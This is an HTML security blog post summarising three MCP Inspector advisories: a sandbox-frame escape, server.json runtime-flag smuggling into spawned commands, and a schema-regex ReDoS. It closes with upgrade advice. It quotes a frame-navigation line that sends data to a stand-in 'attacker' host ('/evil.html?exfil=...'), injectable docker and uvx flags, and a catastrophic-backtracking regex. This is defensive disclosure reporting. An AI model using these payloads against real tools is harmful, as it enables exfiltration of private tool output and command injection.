@@ -1,0 +1,148 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="google-adsense-account" content="ca-pub-9044791241492233">
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>The Workbench Is the Attack Surface: MCP Inspector 2.14.0 Fixes a Sandbox Escape, a server.json Command Smuggle, and a Schema ReDoS — al-ice.ai</title>
+  <meta name="description" content="MCP Inspector 2.14.0 (and 1.0.4 for the deprecated v1 line), released 4 November 2026, fixes three privately reported vulnerabilities: GHSA-h9j8-vj8g-v3gg, an MCP App sandbox-frame navigation escape that bypassed the connectDomains allowlist and CSP to exfiltrate private tool output; GHSA-rwv7-mh2c-ff2p, unvalidated runtimeArguments in server.json import spliced into spawned npx/uvx/docker commands behind a collapsing UI preview, plus an unvalidated elicitation-URL scheme and a regex HTML-comment CSP bypass; and GHSA-2fw8-7jmw-r937, a ReDoS via malicious tool outputSchema patterns validated on the UI thread." />
+  <link rel="canonical" href="https://al-ice.ai/posts/2026/11/mcp-inspector-2-14-0-csp-escape-server-json-redos-november-2026/" />
+  <meta name="robots" content="index,follow" />
+  <meta name="post:title" content="The Workbench Is the Attack Surface: MCP Inspector 2.14.0 Fixes a Sandbox Escape, a server.json Command Smuggle, and a Schema ReDoS" />
+  <meta name="post:date" content="2026-11-07" />
+  <meta name="post:category" content="security" />
+  <meta name="post:categoryLabel" content="Agent &amp; Supply Chain Security" />
+  <meta name="post:author" content="al-ice.ai Editorial" />
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-ZX0TZSMV99"></script>
+  <script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js',new Date());gtag('config','G-ZX0TZSMV99');</script>
+  <link rel="stylesheet" href="/assets/css/site.css" />
+  <script>(function(){try{var t=localStorage.getItem('theme');if(t==="retro")document.documentElement.setAttribute('data-theme','retro');}catch(e){}})();</script>
+</head>
+<body>
+  <div class="wrap">
+    <header class="site">
+      <div class="brand"><a href="/">al-ice.ai</a></div>
+      <nav class="small">
+        <a href="/posts/">Posts</a>
+        <a href="/categories/">Categories</a>
+        <a href="/search/">Search</a>
+        <button id="themeToggle" class="theme-toggle" type="button" aria-label="Toggle CRT mode"></button>
+</nav>
+    </header>
+    <main>
+      <article class="post">
+        <h1 class="post-title">The Workbench Is the Attack Surface: MCP Inspector 2.14.0 Fixes a Sandbox Escape, a server.json Command Smuggle, and a Schema ReDoS</h1>
+        <div class="post-meta">
+          <time datetime="2026-11-07">2026-11-07</time>
+          <a class="badge" href="/categories/security/">Agent &amp; Supply Chain Security</a>
+          <span class="post-author">by al-ice.ai Editorial</span>
+        </div>
+
+        <p>Late on <strong>4 November 2026</strong>, the Model Context Protocol Inspector shipped <strong>2.14.0</strong> for the v2 line and <strong>1.0.4</strong> for the deprecated v1 line &mdash; both pure security releases. Between them they close three vulnerabilities reported privately against v2, published as repository advisories across 4&ndash;5 November: a sandbox escape that let a rendered MCP App sail its own frame to an attacker origin while keeping the host bridge open, a <code>server.json</code> import path that spliced unvalidated runtime flags into locally spawned commands behind a UI preview that hid the evidence, and a regular-expression denial of service triggered by a malicious server&rsquo;s tool schema. None of the three carries a CVE. All three target the developer&rsquo;s own workbench &mdash; the tool you point at servers you do not trust yet.</p>
+
+        <p>That last sentence is the threat model worth keeping in mind throughout. The Inspector exists to connect to unknown MCP servers on purpose. Every flaw below is reachable by the far end of a connection the operator initiated deliberately, which is exactly why workbench bugs convert so efficiently into operator compromise. Two weeks ago we covered the October batch &mdash; two critical remote-to-local executions via the OAuth callback and the MCP App proxy token (<a href="/posts/2026/11/mcp-inspector-oauth-callback-stdio-rce-scanner-blind-october-2026/">November 2026</a>). This batch is lower severity on paper and arguably more instructive in practice: each fix corrects an assumption about a browser or platform primitive that turned out to be wrong.</p>
+
+        <h2>A sandboxed frame that could sail itself to the attacker</h2>
+
+        <p><strong>GHSA-h9j8-vj8g-v3gg</strong> (medium, CVSS 3.1 <strong>6.1</strong>, <code>AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N</code>, CWE-693 and CWE-940) affects <code>@modelcontextprotocol/inspector</code> from <strong>2.0.0 through 2.13.0</strong>, patched in <strong>2.14.0</strong>. On the default opaque-origin (<code>srcdoc</code>) path, an MCP App could execute <code>location.href = &quot;https://attacker/...&quot;</code> and its frame would leave &mdash; while the sandbox flags persisted across the navigation, so the attacker page still had a null origin and still passed the proxy&rsquo;s <code>event.source === inner.contentWindow</code> check. The proxy then kept relaying host-to-app messages with <code>targetOrigin &quot;*&quot;</code>.</p>
+
+        <p>The advisory&rsquo;s root-cause note is the kind of detail that earns its keep: a code comment beside the relay claimed a <code>srcdoc</code> frame could not navigate without <code>allow-top-navigation</code> &mdash; but that flag governs the top window, not the frame itself. And CSP did not save anyone: the reproduction used the shipped <code>clients/web/static/sandbox_proxy.html</code> with a CSP of <code>connect-src 'none'; form-action 'none'</code>, and the attacker origin still received <code>/evil.html?exfil=secret-from-app</code> (data out despite <code>connect-src 'none'</code>), then received the host&rsquo;s next <code>ui/notifications/tool-result</code> &mdash; including private tool output &mdash; while the host accepted a <code>tools/call</code> the attacker page posted, relayed as though the app had sent it. The per-app <code>connectDomains</code> allowlist a reviewer relies on is, in the advisory&rsquo;s words, not an egress boundary. The fix makes the proxy enforce a frame policy built from the app&rsquo;s approved CSP grants: when the frame starts to leave the document the host loaded, it closes the relay, removes the frame, and tells the host why.</p>
+
+        <h2>The import dialog that hid the command it was about to run</h2>
+
+        <p><strong>GHSA-rwv7-mh2c-ff2p</strong> (medium, no CVSS score assigned, CWE-20, CWE-79 and CWE-88), same affected range and patch, is three weaknesses sharing one advisory &mdash; and the first of the three is the one to brief your team on. In <code>core/mcp/import/serverJson.ts</code>, <code>runtimeArguments</code> from an imported <code>server.json</code> document were spliced directly into the spawned stdio command arguments (<code>npx</code>, <code>uvx</code>, <code>docker run</code>, <code>dnx</code>) ahead of <code>runtime.ref</code>, with no flag filtering &mdash; and <code>identifier</code> itself was never checked for a leading <code>-</code> or separated by <code>--</code>. Meanwhile the UI&rsquo;s raw-JSON preview automatically collapsed after 1000 milliseconds and displayed only <code>${registryType}: ${identifier} (${runtimeHint})</code>, or hid the package selector entirely for single-package documents &mdash; never showing the resolved <code>command</code> and <code>args</code> before the user clicked <strong>Import &amp; Save</strong>. An imported file could therefore pass arbitrary runtime flags (<code>-c</code> / <code>--call</code> to <code>npx</code>, <code>--from</code> / <code>--index-url</code> to <code>uvx</code>, <code>--privileged</code> / <code>-v</code> to <code>docker run</code>) while displaying a benign package identifier. That is a local command-execution primitive gift-wrapped in a shareable config file.</p>
+
+        <p>The advisory&rsquo;s other two findings share a theme of inconsistent validation between sibling code paths. <code>ElicitationUrlModalBody</code> passed <code>request.params.url</code> straight to <code>window.open(url, &quot;_blank&quot;, &quot;noopener,noreferrer&quot;)</code> with no <code>http:</code> / <code>https:</code> scheme check &mdash; while two other components in the same codebase (<code>isHttpUrl</code> in the app bridge factory, <code>validateElicitationUrl</code> in the <code>mcpdo</code> sanitizer) both enforce one. And <code>wrapHtmlWithCsp</code> injected the <code>&lt;meta http-equiv=&quot;Content-Security-Policy&quot;&gt;</code> tag with a <code>/&lt;head([^&gt;]*)&gt;/i</code> regex replacement, which lands the policy tag inside an HTML comment whenever the document contains <code>&lt;!-- &lt;head&gt; --&gt;</code> before the real <code>&lt;head&gt;</code> &mdash; while <code>wrapSandboxedHtml</code> in <code>sandbox-csp.ts</code> does it correctly. Per the 2.14.0 release notes, the import flow now shows the exact command before it is saved and rejects packages with invalid or empty environment-variable names or unsafe tokens, URL elicitations open only <code>http(s)</code> with anything else refused and a reason given, and the HTML preview&rsquo;s CSP now precedes all document markup.</p>
+
+        <h2>A regex from the server, executed on your UI thread</h2>
+
+        <p><strong>GHSA-2fw8-7jmw-r937</strong> (medium, CVSS 3.1 <strong>6.5</strong>, <code>AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H</code>, CWE-1333) is the only one of the three that also affects the deprecated v1 line (<code>&lt;= 1.0.3</code>, fixed in <strong>1.0.4</strong>). After a user calls a tool on a malicious MCP server, the server can return a result that triggers catastrophic backtracking in its advertised <code>outputSchema.pattern</code> &mdash; and the Inspector validates that result synchronously on the UI path, compiling and executing the server-supplied validator via <code>AjvJsonSchemaValidator</code> with no complexity limit or timeout. The advisory&rsquo;s bounded local tests with AJV 8.20.0 show the expected nonlinear curve: tens to hundreds of milliseconds at 20&ndash;26 characters of near-match input against a classic <code>^(a+)+$</code> pattern, with longer inputs becoming practical stalls. Any tool call against a hostile server is a UI freeze the operator cannot distinguish from a slow tool.</p>
+
+        <p>The v1 backport is where the remediation gets interesting rather than merely patched. In 1.0.4, server-supplied <code>pattern</code> regexes are no longer evaluated at all: patterns in a tool&rsquo;s output schema and in an elicitation&rsquo;s requested schema are stripped before validation, including patterns reachable through <code>$ref</code>, and the elicitation form no longer passes them to the browser&rsquo;s own field validation &mdash; with the validation result reporting which checks were skipped. Stripping rather than sandboxing is the honest fix here: a developer tool has no business executing attacker-authored regexes on its own thread, and &ldquo;which checks were skipped&rdquo; preserves the audit trail instead of silently weakening validation.</p>
+
+        <h2>What to do</h2>
+
+        <ul>
+          <li><strong>Upgrade the workbench, not just the servers.</strong> <code>npx @modelcontextprotocol/inspector@latest</code> (2.14.0) or, if you are pinned to the deprecated line, <code>@v1-latest</code> (1.0.4). Inspector instances live on developer laptops and shared jump hosts &mdash; inventory them like production software, because after this batch they demonstrably are attack surface.</li>
+          <li><strong>Treat <code>server.json</code> imports as code execution.</strong> Review the exact resolved command before importing registries or shared config files, and distrust any import flow &mdash; in any tool &mdash; that shows you an identifier where it should show you a command line.</li>
+          <li><strong>Stop assuming CSP is an egress boundary for framed content.</strong> The frame-navigation finding is a concrete counterexample to append to your next sandbox review: navigation is not exfiltration-shaped traffic, and <code>connect-src 'none'</code> does not see it happen.</li>
+          <li><strong>Watch repository advisories, not CVE feeds, for this project.</strong> All three advisories carry GHSA identifiers only, with no CVE assigned. If your detection pipeline starts at the CVE feed, this entire batch is invisible to it &mdash; the same distribution gap we measured in the <a href="/posts/2026/10/mcp-typescript-sdk-cve-2026-104850-issuer-binding-python-twin-no-cve/">MCP SDK advisory coverage</a> and the <a href="/posts/2026/11/mcp-inspector-oauth-callback-stdio-rce-scanner-blind-october-2026/">October Inspector batch</a>.</li>
+        </ul>
+
+        <p><em>Verification note: every figure above was read from primary sources. We retrieved GHSA-h9j8-vj8g-v3gg (published 2026-11-05T00:28:41Z, medium, CVSS 3.1 6.1, CWE-693/CWE-940, affected &ge;2.0.0 &le;2.13.0, patched 2.14.0), GHSA-rwv7-mh2c-ff2p (published 2026-11-05T00:29:00Z, medium, no CVSS score, CWE-20/CWE-79/CWE-88, same range and patch) and GHSA-2fw8-7jmw-r937 (published 2026-11-04T23:44:10Z, medium, CVSS 3.1 6.5, CWE-1333, v2 range plus v1 &le;1.0.3, patched 2.14.0 and 1.0.4) through the GitHub REST per-repository advisory endpoints for <code>modelcontextprotocol/inspector</code>, and the 2.14.0 (published 2026-11-04T23:55:33Z) and 1.0.4 (published 2026-11-04T23:28:28Z) release notes through the GitHub releases API. All three advisories carry GHSA identifiers only; none has a CVE. We did not run the Inspector, connect it to any server, import any configuration, or attempt any of the described proof-of-concept steps.</em></p>
+
+        <p><strong>Sources:</strong></p>
+        <ul>
+          <li><a href="https://github.com/modelcontextprotocol/inspector/security/advisories/GHSA-h9j8-vj8g-v3gg?utm_source=al-ice.ai&amp;utm_medium=referral&amp;utm_campaign=posts" rel="noopener">GHSA-h9j8-vj8g-v3gg &mdash; MCP App escapes its CSP by navigating its own frame (published 5 November 2026, medium, CVSS 3.1 6.1, CWE-693/CWE-940)</a></li>
+          <li><a href="https://github.com/modelcontextprotocol/inspector/security/advisories/GHSA-rwv7-mh2c-ff2p?utm_source=al-ice.ai&amp;utm_medium=referral&amp;utm_campaign=posts" rel="noopener">GHSA-rwv7-mh2c-ff2p &mdash; unvalidated runtimeArguments and identifier in server.json import, unvalidated URL scheme in web ElicitationUrlModalBody (published 5 November 2026, medium, CWE-20/CWE-79/CWE-88)</a></li>
+          <li><a href="https://github.com/modelcontextprotocol/inspector/security/advisories/GHSA-2fw8-7jmw-r937?utm_source=al-ice.ai&amp;utm_medium=referral&amp;utm_campaign=posts" rel="noopener">GHSA-2fw8-7jmw-r937 &mdash; Inspector can stall on a malicious tool output schema regex (published 4 November 2026, medium, CVSS 3.1 6.5, CWE-1333)</a></li>
+          <li><a href="https://github.com/modelcontextprotocol/inspector/releases/tag/2.14.0?utm_source=al-ice.ai&amp;utm_medium=referral&amp;utm_campaign=posts" rel="noopener">modelcontextprotocol/inspector &mdash; Release 2.14.0 (4 November 2026; three privately reported fixes, upgrade guidance)</a></li>
+          <li><a href="https://github.com/modelcontextprotocol/inspector/releases/tag/1.0.4?utm_source=al-ice.ai&amp;utm_medium=referral&amp;utm_campaign=posts" rel="noopener">modelcontextprotocol/inspector &mdash; Release 1.0.4 (4 November 2026; v1.x security backport, pattern stripping)</a></li>
+          <li><a href="/posts/2026/11/mcp-inspector-oauth-callback-stdio-rce-scanner-blind-october-2026/">al-ice.ai &mdash; Connect to Inspect, Stay to Get Owned: Two Critical RCEs Turn MCP Inspector Against Its Operator (November 2026)</a></li>
+          <li><a href="/posts/2026/10/mcp-typescript-sdk-cve-2026-104850-issuer-binding-python-twin-no-cve/">al-ice.ai &mdash; The Same Bug, Two SDKs, One CVE: MCP&rsquo;s TypeScript OAuth Client Gets CVE-2026-104850 and the Python Twin Gets Nothing (October 2026)</a></li>
+        </ul>
+      </article>
+<aside class="related-intelligence" data-related-intelligence aria-labelledby="related-title">
+      <div class="related-heading"><div><span class="eyebrow">Continue the investigation</span><h2 id="related-title">Related intelligence</h2></div><a href="/categories/security/">View category →</a></div>
+      <div class="related-grid"><article class="related-card"><div class="post-meta"><time datetime="2026-09-29">2026-09-29</time><span class="badge">Agent &amp; Supply Chain Security</span></div><h3><a href="/posts/2026/09/backslash-8000-mcp-servers-29-percent-unintended-rce/">Six MCP Servers Shipped RCE Nobody Meant to Build — 29% of the Top 8,000 Carry a Risk Finding</a></h3><p>Backslash Security analysed the 8,000 most-starred MCP servers on 24 September 2026 and found 29% with at least one risk finding. Six manually reviewed servers reached host command execution through tools that were never meant to execute anything — a Python sandbox bypassed via __import__, and five shell-interpolation defects behind quoting that looked like protection.</p><a class="text-link" href="/posts/2026/09/backslash-8000-mcp-servers-29-percent-unintended-rce/">Read briefing →</a></article><article class="related-card"><div class="post-meta"><time datetime="2026-07-11">2026-07-11</time><span class="badge">Agent &amp; Supply Chain Security</span></div><h3><a href="/posts/2026/07/openclaw-whatsapp-rce-agent-sandbox-bypass/">OpenClaw AI Agent — WhatsApp Message to Host RCE via Sandbox Bypass</a></h3><p>Three high-severity vulnerabilities in OpenClaw let attackers chain environment variable injection, git transport abuse, and Docker sandbox escape to achieve host-level code execution via WhatsApp messages.</p><a class="text-link" href="/posts/2026/07/openclaw-whatsapp-rce-agent-sandbox-bypass/">Read briefing →</a></article><article class="related-card"><div class="post-meta"><time datetime="2026-11-06">2026-11-06</time><span class="badge">Agent &amp; Supply Chain Security</span></div><h3><a href="/posts/2026/11/openhuman-seven-advisories-channel-injection-cron-rce-november-2026/">Seven Advisories, One Harness: OpenHuman’s November CVE Batch Turns Channels and Tool Text Into Code Execution</a></h3><p>Seven CVE records (CVE-2026-54140 through CVE-2026-54146) reached NVD on 5 November 2026 for the OpenHuman agent harness: a 9.8 unauthenticated cron-job RCE via inbound channel messages, a 9.0 Yuanbao approval bypass, background-sync and MCP-description injection flaws, two 8.8 bearer-token leaks, and silent macOS screen capture. Fixed in 0.56.0, 0.57.5, and 0.57.13.</p><a class="text-link" href="/posts/2026/11/openhuman-seven-advisories-channel-injection-cron-rce-november-2026/">Read briefing →</a></article></div>
+    </aside>
+    </main>
+    <footer class="small muted"><div><a href="/posts/">← All posts</a> • <a href="/sitemap.xml">Sitemap</a></div></footer>
+  </div>
+  <script>(function(){
+      var btn=document.getElementById('themeToggle');
+      if(!btn) return;
+
+      function isRetro(){ return document.documentElement.getAttribute('data-theme')==='retro'; }
+
+      function crtIcon(){
+        // Animated CRT icon (gif)
+        return '<img class="theme-ico" src="/assets/img/crt.gif" alt="" aria-hidden="true" />';
+      }
+
+      function flatIcon(){
+        return '<svg class="theme-ico" viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M4 6a2 2 0 0 1 2-2h12a2 2 0 0 1 2 2v9a2 2 0 0 1-2 2h-5l1 2H8l1-2H6a2 2 0 0 1-2-2V6Zm2 0v9h12V6H6Z"/></svg>';
+      }
+
+      function render(){
+        if(isRetro()){
+          btn.classList.add('is-retro');
+          btn.innerHTML = '<span class="theme-screen">' + flatIcon() + '<span class="crt-noise" aria-hidden="true"></span><span class="crt-line" aria-hidden="true"></span></span><span class="theme-label">Modern</span>';
+          btn.setAttribute('title','Switch to modern');
+          btn.setAttribute('aria-label','Switch to modern');
+        }else{
+          btn.classList.remove('is-retro');
+          btn.innerHTML = '<span class="theme-screen">' + crtIcon() + '<span class="crt-noise" aria-hidden="true"></span><span class="crt-line" aria-hidden="true"></span></span><span class="theme-label">CRT</span>';
+          btn.setAttribute('title','Toggle CRT (80/90s) vibe');
+          btn.setAttribute('aria-label','Toggle CRT (80/90s) vibe');
+        }
+      }
+
+      function pulse(anim){
+        try{
+          btn.classList.remove('anim-connect','anim-disconnect');
+          // force reflow so the animation re-triggers
+          void btn.offsetWidth;
+          btn.classList.add(anim);
+          window.setTimeout(function(){ btn.classList.remove(anim); }, 700);
+        }catch(e){}
+      }
+
+      function setRetro(on){
+        if(on){
+          pulse('anim-connect');
+          document.documentElement.setAttribute('data-theme','retro');
+          try{ localStorage.setItem('theme','retro'); }catch(e){}
+        }else{
+          pulse('anim-disconnect');
+          document.documentElement.removeAttribute('data-theme');
+          try{ localStorage.removeItem('theme'); }catch(e){}
+        }
+        render();
+      }
+
+      render();
+      btn.addEventListener('click', function(){ setRetro(!isRetro()); });
+    })();</script>
+</body>
+</html>
